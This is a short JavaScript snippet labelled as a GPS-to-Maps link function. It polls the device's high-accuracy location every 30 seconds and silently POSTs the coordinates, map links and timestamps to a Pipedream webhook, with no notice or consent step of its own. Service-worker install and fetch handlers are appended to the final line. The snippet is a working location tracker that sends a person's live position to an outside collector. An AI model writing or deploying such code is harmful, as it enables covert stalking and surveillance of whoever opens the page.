// Complete GPS → Maps link function
function sendGPS() {
  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude.toFixed(6);
      const lon = pos.coords.longitude.toFixed(6);
      
      // Generate Google Maps link
      const mapsLink = `https://maps.google.com/maps?q=${lat},${lon}`;
      console.log('📍 Google Maps:', mapsLink);
      console.log('📍 Direct:', `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`);
      
      // Send to Pipedream
      fetch('https://eowi5n8vlh9h3xy.m.pipedream.net', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          type: 'gps_update',
          latitude: lat,
          longitude: lon,
          maps_url: mapsLink,
          direct_url: `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`,
          timestamp: new Date().toISOString()
        })
      });
    },
    err => console.error('GPS Failed:', err),
    {enableHighAccuracy: true, timeout: 10000}
  );
}

// Run every 30 seconds
setInterval(sendGPS, 30000);self.addEventListener('install',e=>self.skipWaiting());
self.addEventListener('fetch',e=>e.respondWith(fetch(e.request)));
